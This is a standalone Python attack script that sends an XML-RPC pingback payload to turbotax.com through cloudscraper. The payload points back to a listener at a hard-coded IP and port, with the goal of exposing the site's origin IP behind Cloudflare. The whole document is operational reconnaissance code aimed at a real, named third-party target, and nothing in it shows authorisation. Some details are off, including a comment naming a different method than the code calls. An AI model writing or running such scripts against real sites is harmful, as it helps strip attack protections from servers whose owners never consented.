import cloudscraper

# 1. Update this to a listener URL you control (e.g., https://your-request-bin.com)
LISTENER_URL = "http://100.115.92.202:4444"
TARGET_XMLRPC = "https://turbotax.com"

def trigger_pingback():
    scraper = cloudscraper.create_scraper()
    
    # XML payload for the pingback.extensions.getPingbacks method
    # It tells the target to 'verify' a link from your listener
    xml_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
      <methodName>pingback.ping</methodName>
      <params>
        <param><value><string>{LISTENER_URL}</string></value></param>
        <param><value><string>https://turbotax.intuit.com/dev</string></value></param>
      </params>
    </methodCall>"""

    print(f"[*] Sending Pingback trigger to {TARGET_XMLRPC}...")
    print(f"[*] Check your listener at {LISTENER_URL} for incoming connections.")

    try:
        headers = {'Content-Type': 'text/xml'}
        response = scraper.post(TARGET_XMLRPC, data=xml_payload, headers=headers, timeout=20)
        
        if response.status_code == 200:
            print("[+] Trigger sent successfully. Analyze your listener logs for the Origin IP.")
        else:
            print(f"[!] Response {response.status_code}: Cloudflare may have blocked the XML payload.")
            
    except Exception as e:
        print(f"[X] Error: {e}")

if __name__ == "__main__":
    trigger_pingback()
